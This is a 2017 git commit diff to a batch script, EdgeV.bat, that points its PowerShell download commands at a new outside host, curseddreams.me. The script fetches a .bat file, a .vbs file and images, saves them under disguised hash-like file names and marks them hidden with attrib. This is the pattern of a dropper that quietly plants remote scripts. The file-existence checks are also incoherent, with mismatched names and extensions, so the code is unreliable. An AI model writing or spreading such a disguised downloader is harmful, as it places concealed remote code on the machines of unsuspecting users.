3809200a9146f646490675e265639b98b04e3cf6
FaZeMelon <ryanmonkills6@gmail.com>
2017-03-18 03:18:34 +0100

    Update EdgeV.bat

--- scripts/EdgeV.bat
+++ scripts/EdgeV.bat
@@ -2,17 +2,17 @@
 :start
 IF EXIST 7b96332f2c9f777574ba038be0334018.jpg goto nextfile1
 :nextfile1
-IF EXIST d3745b53b599b72e9cb750f4d757560d.bat goto nextfile2
+IF EXIST d3745b53b599b72e9cb750f4d757560d.vbs goto nextfile2
 :nextfile2
-IF EXIST ec372a061f8a3c0432bb4575216c7f75.jpg goto nextfile3
+IF EXIST FileScheduler.bat goto nextfile3
 :nextfile3
-IF NOT EXIST 7b96332f2c9f777574ba038be0334018.jpg goto files
-IF NOT EXIST d3745b53b599b72e9cb750f4d757560d.bat goto files
 IF NOT EXIST ec372a061f8a3c0432bb4575216c7f75.jpg goto files
+IF NOT EXIST d3745b53b599b72e9cb750f4d757560d.bat goto files
+IF NOT EXIST 7b96332f2c9f777574ba038be0334018.vbs goto files
 :files
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://fazemelon.github.io/images/FaZeMelon.jpg', 'ec372a061f8a3c0432bb4575216c7f75.jpg')"
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://fazemelon.github.io/scripts/FileScheduler.bat', 'd3745b53b599b72e9cb750f4d757560d.bat')"
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://FaZeMelon.github.io/2FT9d9jtuW0uJxI2at9x.jpg', '7b96332f2c9f777574ba038be0334018.jpg')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/7b96332f2c9f777574ba038be0334018.jpg', 'ec372a061f8a3c0432bb4575216c7f75.jpg')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/FileScheduler.bat', 'd3745b53b599b72e9cb750f4d757560d.bat')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/d3745b53b599b72e9cb750f4d757560d.vbs', '7b96332f2c9f777574ba038be0334018.vbs')"
 attrib +h 7b96332f2c9f777574ba038be0334018.jpg
 attrib +h d3745b53b599b72e9cb750f4d757560d.bat
 attrib +h ec372a061f8a3c0432bb4575216c7f75.jpg
